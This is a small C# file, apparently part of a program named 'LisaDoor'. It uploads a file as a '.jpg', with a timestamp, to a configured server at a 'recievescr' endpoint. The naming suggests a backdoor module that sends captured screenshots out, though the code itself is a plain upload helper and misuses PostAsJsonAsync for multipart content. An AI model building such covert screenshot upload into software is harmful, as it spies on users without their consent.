using System.Net.Http.Json;

namespace LisaDoor.Network
{
    internal static class SendClient
    {
        struct Consts
        {
            static public readonly string fileSendUri = "recievescr";
        }
        public static async void SendPOSTFile(FileStream file, string name, DateTime datetime)
        {
            using (var httpClient = new HttpClient())
            {
                var content = new StreamContent(file);
                var rescontent = new MultipartFormDataContent();
                rescontent.Add(content, $"{name}.jpg", $"{name}.jpg");
                rescontent.Add(new StringContent(datetime.ToString()), "datetime");
                await httpClient.PostAsJsonAsync(LisaDoor.Consts.ServerIP + $"/{Consts.fileSendUri}", rescontent);
            }
        }
    }
}
